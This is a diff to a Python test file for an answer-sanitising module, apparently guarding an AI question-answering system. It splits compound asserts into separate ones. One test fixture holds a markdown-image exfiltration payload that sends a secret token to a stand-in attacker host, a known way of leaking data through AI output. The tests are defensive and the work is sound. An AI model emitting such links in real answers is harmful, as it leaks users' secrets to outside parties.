@@ -13,7 +13,8 @@ from cortex.security.prompting import (
 def test_markdown_image_exfiltration_is_removed() -> None:
     answer = "Pods run containers [1]. ![x](https://attacker.example/?d=SECRET-TOKEN)"
     clean, removed = strip_exfiltration(answer)
-    assert "attacker.example" not in clean and "SECRET" not in clean
+    assert "attacker.example" not in clean
+    assert "SECRET" not in clean
     assert removed == 1
 
 
@@ -30,7 +31,8 @@ def test_html_images_reference_images_and_query_links_are_removed() -> None:
 
 def test_plain_reference_urls_without_queries_survive() -> None:
     clean, removed = strip_exfiltration("Read https://kubernetes.io/docs/concepts/ for more [1].")
-    assert "https://kubernetes.io/docs/concepts/" in clean and removed == 0
+    assert "https://kubernetes.io/docs/concepts/" in clean
+    assert removed == 0
 
 
 def test_documents_cannot_close_their_own_delimiter() -> None:
@@ -51,4 +53,5 @@ def test_uncited_or_not_found_answers_become_not_found() -> None:
     text, nf, info = finalize_answer("Pods are great.", 3)
     assert (text, nf, info["reason"]) == (NOT_FOUND_TEXT, True, "no_citations")
     text, nf, _ = finalize_answer("A Pod runs containers [1].", 3)
-    assert not nf and text == "A Pod runs containers [1]."
+    assert not nf
+    assert text == "A Pod runs containers [1]."
